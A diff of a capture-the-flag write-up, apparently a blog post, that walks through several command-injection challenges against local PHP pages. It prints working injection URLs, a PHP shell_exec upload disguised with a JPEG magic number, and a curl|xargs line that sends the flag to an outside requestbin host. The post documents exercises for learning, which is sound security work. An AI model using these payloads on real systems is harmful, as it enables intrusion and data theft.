@@ -16,23 +16,23 @@ For any challenge I like to observe the normal functionality of the application 
 
 Looking at the HTML, the form action is a GET request. Given an input of `8.8.8.8` we're taken to,
 
-```{% raw %}
+```
 http://127.0.0.1:8081/index.php?ip=8.8.8.8&submit=Ping%21
-{% endraw %}```
+```
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce1-001.png)
 
 Given that this is the easiest level, I'm going to assume that this is the most nakedly vulnerable application possible. My guess is the user input is being appended to the `ping` command as a string and passed without modification to the system, like:
 
-```{% raw %}
+```
 system('ping ' . $_GET['ip']);
-{% endraw %}```
+```
 
 The semicolon can be used as a [command seperator](https://www.tldp.org/LDP/abs/html/special-chars.html) in bash. Try,
 
-```{% raw %}
+```
 http://127.0.0.1:8081/index.php?ip=8.8.8.8;%20hostname&submit=Ping!
-{% endraw %}```
+```
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce1-002.png)
 
@@ -42,9 +42,9 @@ The `hostname` POC worked. It's a good test command because it's likely to be on
 
 What we're really after is this, however...
 
-```{% raw %}
+```
 http://127.0.0.1:8081/index.php?ip=8.8.8.8;%20cat%20/tmp/flag.txt&submit=Ping!
-{% endraw %}```
+```
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce1-003.png)
 
@@ -54,17 +54,17 @@ http://127.0.0.1:8081/index.php?ip=8.8.8.8;%20cat%20/tmp/flag.txt&submit=Ping!
 
 Testing for normal functionality...
 
-```{% raw %}
+```
 http://127.0.0.1:8082/index.php?domain=google.com&submit=Lookup
-{% endraw %}```
+```
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce2-001.png)
 
 Trying the same trick as Challenge 1...
 
-```{% raw %}
+```
 http://127.0.0.1:8082/index.php?domain=google.com;%20hostname&submit=Lookup
-{% endraw %}```
+```
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce2-002.png)
 
@@ -76,9 +76,9 @@ To use `&&` in the URL the ampersands must be encoded. Ampersands are an "unsafe
 
 Try,
 
-```{% raw %}
+```
 http://127.0.0.1:8082/index.php?domain=google.com%20%26%26%20cat%20/tmp/flag.txt&submit=Lookup
-{% endraw %}```
+```
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce2-003.png)
 
@@ -88,9 +88,9 @@ http://127.0.0.1:8082/index.php?domain=google.com%20%26%26%20cat%20/tmp/flag.txt
 
 Try it.
 
-```{% raw %}
+```
 http://127.0.0.1:8083/index.php?domain=google.com&submit=Lookup
-{% endraw %}```
+```
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce3-001.png)
 
@@ -100,9 +100,9 @@ With our ability to chain commands pretty well defeated, let's try [command subs
 
 Trying command substitution using back-ticks,
 
-```{% raw %}
+```
 http://127.0.0.1:8083/index.php?domain=`cat%20/tmp/flag.txt`&submit=Lookup
-{% endraw %}```
+```
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce3-002.png)
 
@@ -114,9 +114,9 @@ The format of WHOIS results depends on the TLD. Note in the following example lo
 
 We can use this to our advantage. Throw a `.com` after the flag value so we're looking up... we don't know what but it ends in `.com` now!
 
-```{% raw %}
+```
 http://127.0.0.1:8083/index.php?domain=`cat%20/tmp/flag.txt`.com&submit=Lookup
-{% endraw %}```
+```
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce3-004.png)
 
@@ -128,9 +128,9 @@ If this was a CTF and capitalization was important for the scoreboard I'd guess 
 
 Do it.
 
-```{% raw %}
+```
 http://127.0.0.1:8084/index.php?domain=google.com&submit=Scan
-{% endraw %}```
+```
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce4-001.png)
 
@@ -138,9 +138,9 @@ My first thought here was to use the `/tmp/flag.txt` as input to Nmap with `-iL`
 
 We can confirm flags are accepted by Nmap doing something like `--iflist` which will produce some output no matter what.
 
-```{% raw %}
+```
 http://127.0.0.1:8084/index.php?domain=--iflist&submit=Scan
-{% endraw %}```
+```
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce4-002.png)
 
@@ -148,9 +148,9 @@ I could not figure out how to make it happen with Nmap flags.
 
 A totally different idea - maybe chaining commands isn't dead. Newline?
 
-```{% raw %}
+```
 http://127.0.0.1:8084/index.php?domain=google.com%0Acat%20/tmp/flag.txt&submit=Scan
-{% endraw %}```
+```
 
 Yep.
 
@@ -162,7 +162,7 @@ Yep.
 
 Uploading a file, the POST request looks like the typical `multipart/form-data` variety.
 
-```{% raw %}
+```
 POST http://127.0.0.1:8085/index.php HTTP/1.1
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -189,13 +189,13 @@ Content-Disposition: form-data; name="submit"
 
 Scan
 -----------------------------35851058717958058741374149380--
-{% endraw %}```
+```
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce5-001.png)
 
 The "You can download the file here" link has a long hash-like name and serves the file as expected.
 
-```{% raw %}
+```
 # curl -v http://127.0.0.1:8085/uploads/df5c94a635fd6feb14aab94e5fd3ed10cdb13b2f0526bb1466c0e12474db93e3.txt
 *   Trying 127.0.0.1...
 * TCP_NODELAY set
@@ -216,7 +216,7 @@ The "You can download the file here" link has a long hash-like name and serves t
 < 
 what if i'm just a test file :'(
 * Connection #0 to host 127.0.0.1 left intact
-{% endraw %}```
+```
 
 Bad things can happen when a web application serves user-provided files. This being a PHP application, the first thought should be, 'can I upload a PHP file?' and the second, 'will it execute?'
 
@@ -226,7 +226,7 @@ Modify the request above to use a `.php` filename and replace the file contents 
 
 Answer to the first question is yes, we can upload PHP files. But will it execute?
 
-```{% raw %}
+```
 # curl -v http://127.0.0.1:8085/uploads/b0d0320f1440a2b9a325ead8338cd45aabc89740b8ea633c7dc4a5c856a6215a.php
 *   Trying 127.0.0.1...
 * TCP_NODELAY set
@@ -246,7 +246,7 @@ Answer to the first question is yes, we can upload PHP files. But will it execut
 flag{RipBoilingWater,YouWillBeMist}
 * Connection #0 to host 127.0.0.1 left intact
 source: https://www.reddit.com/r/oneliners/comments/78mp1h/rip_boiling_water_you_will_be_mist/
-{% endraw %}```
+```
 
 Yep.
 
@@ -268,29 +268,29 @@ The most straightforward way of determining the type of a file is looking at the
 
 Take the first 4 bytes of a valid JPG and copy into it's own file.
 
-```{% raw %}
+```
 root@kali ~/A/corn# dd if=test.jpg of=jpgmagicnum.dat bs=1 count=4
 4+0 records in
 4+0 records out
 4 bytes transferred in 0.000125 secs (31957 bytes/sec)
-{% endraw %}```
+```
 
 `cat` the magic number plus the malicious PHP payload into a new file. Why use a PHP file extension and not JPG? We found earlier that it doesn't matter as far as the file being rejected or not, but it might matter in terms of whether the server will decide to execute our file as PHP.
 
-```{% raw %}
+```
 root@kali ~/A/corn# cat flag.php 
 <?php print shell_exec('cat /tmp/flag.txt'); ?>
 root@kali ~/A/corn# cat jpgmagicnum.dat flag.jpg > pwn.php
-{% endraw %}```
+```
 
 The magic number in front of our PHP payload is enough to fool the `file` command locally.
 
-```{% raw %}
+```
 root@kali ~/A/corn# cat pwn.php 
 ????<?php print shell_exec('cat /tmp/flag.txt'); ?>
 root@kali ~/A/corn# file pwn.php 
 pwn.php: JPEG image data
-{% endraw %}```
+```
 
 No metadata was found. Well I'm not surprised!
 
@@ -298,7 +298,7 @@ No metadata was found. Well I'm not surprised!
 
 Checking the link...
 
-```{% raw %}
+```
 # curl -v http://127.0.0.1:8086/uploads/420698287ca445da53fc584baca464ffa28bfa5421d9fd709df7b2785e6e3395.php
 *   Trying 127.0.0.1...
 * TCP_NODELAY set
@@ -318,7 +318,7 @@ Checking the link...
 ????flag{WhoeverPutThe"B"In"Subtle"WasClever}
 * Connection #0 to host 127.0.0.1 left intact
 Source: https://www.reddit.com/r/Showerthoughts/comments/1hwbdr/the_letter_b_in_the_word_subtle_is/
-{% endraw %}```
+```
 
 Booyah.
 
@@ -328,33 +328,33 @@ Booyah.
 
 Back to a GET form action on this one. Testing with Google...
 
-```{% raw %}
+```
 http://127.0.0.1:8087/index.php?domain=google.com&submit=Scan
-{% endraw %}```
+```
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce7-001.png)
 
 It outputs a whooole lot, not going to include it all here. Something new for this level is that in addition to a number of illegal characters, certain words are banned like `cat`.
 
-```{% raw %}
+```
 http://127.0.0.1:8087/index.php?domain=cat&submit=Scan
-{% endraw %}```
+```
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce7-002.png)
 
 After some playing around I determined newline characters are not among the banned. Just need to find a command that isn't a prohibited string - `tac` is my go-to item there. It's `cat` but backwards, as the name suggests. Frequently overlooked!
 
-```{% raw %}
+```
 http://127.0.0.1:8087/index.php?domain=google.com%0Atac%20/tmp/flag.txt&submit=Scan
-{% endraw %}```
+```
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce7-003.png)
 
 The command injection worked since that's a `tac` error message but the outcome isn't as desired. `:443` appears to be appended to the user's input.  We can clean that up with a `#` to comment out everything that follows.
 
-```{% raw %}
+```
 http://127.0.0.1:8087/index.php?domain=google.com%0Atac%20/tmp/flag.txt%20%23&submit=Scan
-{% endraw %}```
+```
 
 Note that like `&` from Challenge 2, `#` is an "unsafe" character per [RFC-1738](http://www.ietf.org/rfc/rfc1738.txt) and must be encoded as `%23`.
 
@@ -370,9 +370,9 @@ Can't quite read it so we'll take a look in the source. Why is the Reddit link f
 
 Try it.
 
-```{% raw %}
+```
 http://127.0.0.1:8088/index.php?user=mike&submit=Scan
-{% endraw %}```
+```
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce8-001.png)
 
@@ -380,17 +380,17 @@ No users named Mike... this application is obviously a work of fiction.
 
 In the course of trying some things I found that an ampersand provokes an error message.
 
-```{% raw %}
+```
 http://127.0.0.1:8088/index.php?user=*&submit=Scan
-{% endraw %}```
+```
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce8-002.png)
 
 The error message is from the `find` command, a huge clue as to how this works. I'm not familiar with this particular error and found [some advice](https://stackoverflow.com/questions/6495501/find-paths-must-precede-expression-how-do-i-specify-a-recursive-search-that) via Google'ing to use quotes.
 
-```{% raw %}
+```
 http://127.0.0.1:8088/index.php?user=%22*%22&submit=Scan
-{% endraw %}```
+```
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce8-003.png)
 
@@ -398,14 +398,14 @@ Well then! Based on the use of the `find` command, we can guess the way this dir
 
 Set up a local POC with some empty files and names from the list above.
 
-```{% raw %}
+```
 root@kali ~/A/c/08# ls
 Sam  Shannon  Sophia
-{% endraw %}```
+```
 
 We'll assume the `find` command used by the application is simple and just appends the user input to the end. Trying some tests,
 
-```{% raw %}
+```
 root@kali ~/A/c/08# find . -name Sam
 ./Sam
 root@kali ~/A/c/08# find . -name "*"
@@ -413,7 +413,7 @@ root@kali ~/A/c/08# find . -name "*"
 ./Sophia
 ./Shannon
 ./Sam
-{% endraw %}```
+```
 
 Not exactly the same output formatting as the web application, but it works.
 
@@ -421,22 +421,22 @@ Not exactly the same output formatting as the web application, but it works.
 
 The command we'll run is to `cat` the flag to the matched file (Sam). The following will match Sam and then execute `cat /tmp/flag.txt Sam`
 
-```{% raw %}
+```
 root@kali ~/A/c/08# find . -name Sam -exec cat /tmp/flag.txt {} +
 flag{localPOCflag}
-{% endraw %}```
+```
 
 So our payload is,
 
-```{% raw %}
+```
 Sam -exec cat /tmp/flag.txt {} +
-{% endraw %}```
+```
 
 For some reason this challenge is especially sensitive to URL encoding. To avoid problems I've encoded all non-alpha characters in the payload.
 
-```{% raw %}
+```
 http://127.0.0.1:8088/index.php?user=Sam%20-exec%20cat%20%2Ftmp%2Fflag.txt%20%7B%7D%20%2B&submit=Scan
-{% endraw %}```
+```
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce8-004.png)
 
@@ -448,9 +448,9 @@ Woo.
 
 Test run.
 
-```{% raw %}
+```
 http://127.0.0.1:8089/index.php?url=example.com&string=coordination&submit=Scan
-{% endraw %}```
+```
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce9-001.png)
 
@@ -460,16 +460,16 @@ We'll assume the application, like previous challenges, is coded in a very strai
 
 Note that `curl` can be used to read fetch a local file.
 
-```{% raw %}
+```
 root@kali ~/A/c/09# curl file:///tmp/flag.txt
 flag{localPOCflag}
-{% endraw %}```
+```
 
 Let's try that online, search for 'flag' in the URL `file:///tmp/flag.txt` since we know it will be there.
 
-```{% raw %}
+```
 http://127.0.0.1:8089/index.php?url=file%3A%2F%2F%2Ftmp%2Fflag.txt&string=flag&submit=Scan
-{% endraw %}```
+```
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce9-003.png)
 
@@ -481,10 +481,10 @@ For the moment I'll use [https://requestbin.fullcontact.com/](https://requestbin
 
 Quick POC,
 
-```{% raw %}
+```
 root@kali ~/A/c/09# curl http://requestbin.fullcontact.com/1m06f111/flagflagflag
 ok
-{% endraw %}```
+```
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce9-002.png)
 
@@ -494,13 +494,13 @@ To do this we'll `curl` the file into `xargs` and use that to build a second `cu
 
 Our local POC,
 
-```{% raw %}
+```
 root@kali ~/A/c/09# curl file:///tmp/flag.txt | grep flag | xargs -I {} curl http://requestbin.fullcontact.com/1m06f111/{}
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100    19  100    19    0     0  19000      0 --:--:-- --:--:-- --:--:-- 19000
 ok
-{% endraw %}```
+```
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce9-004.png)
 
@@ -508,9 +508,9 @@ Success!
 
 Now for the real deal. Search the URL `file:///tmp/flag.txt` for the string `flag | xargs -I {} curl http://requestbin.fullcontact.com/1m06f111/{}`
 
-```{% raw %}
+```
 http://127.0.0.1:8089/index.php?url=file%3A%2F%2F%2Ftmp%2Fflag.txt&string=flag+%7C+xargs+-I+%7B%7D+curl+http%3A%2F%2Frequestbin.fullcontact.com%2F1m06f111%2F%7B%7D&submit=Scan
-{% endraw %}```
+```
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce9-005.png)
 
@@ -528,7 +528,7 @@ We can do this by guessing each character from front to back. We know the flag s
 
 Some quick and dirty Python I used when the challenge was still hosted online for the AppSec USA CTF (URL removed),
 
-```{% raw %}
+```
 import socket, urllib
 
 HOST = "<url removed>"
@@ -569,7 +569,7 @@ for i in xrange(64):
 
 print "DONE"
 print p
-{% endraw %}```
+```
 
 Here it is running, fun to watch it go once things are working.
 
